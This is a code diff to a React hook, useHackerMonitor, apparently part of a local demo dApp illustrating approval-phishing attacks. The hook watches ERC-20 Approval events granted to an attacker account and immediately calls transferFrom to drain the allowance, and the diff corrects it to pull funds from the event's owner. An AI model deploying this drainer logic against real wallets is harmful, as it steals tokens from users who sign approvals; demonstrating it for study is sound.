@@ -57,7 +57,6 @@ export function useHackDapp() {
  * for approval events to its account so it could instantly drain them.
  */
 export function useHackerMonitor() {
-  const {address} = useAccount()
   const [hacked, setHacked] = useState(false);
   const provider = useProvider({chainId: chainId.localhost})
 
@@ -95,11 +94,10 @@ export function useHackerMonitor() {
       // Approval(owner, spender, amount)
       console.log(`Approve Listener: `, {myAddress: accounts.attacker, owner, spender, amount})
       if (accounts.attacker === spender) {
-        const fuckingAddress: string = address === undefined ? "" : address?.toString();
-        const allowance = await rvtInst.allowance(fuckingAddress, accounts.attacker)
+        const allowance = await rvtInst.allowance(owner, accounts.attacker)
         if(!allowance.isZero()){
           console.log(`We have been approved: lets go`, {amount: amount.toString(), allowance: allowance.toString()})
-          rvtInst.transferFrom(fuckingAddress, accounts.attacker, allowance)
+          rvtInst.transferFrom(owner, accounts.attacker, allowance)
             .then(value => alert(value), reason => alert(reason))
         }
       }
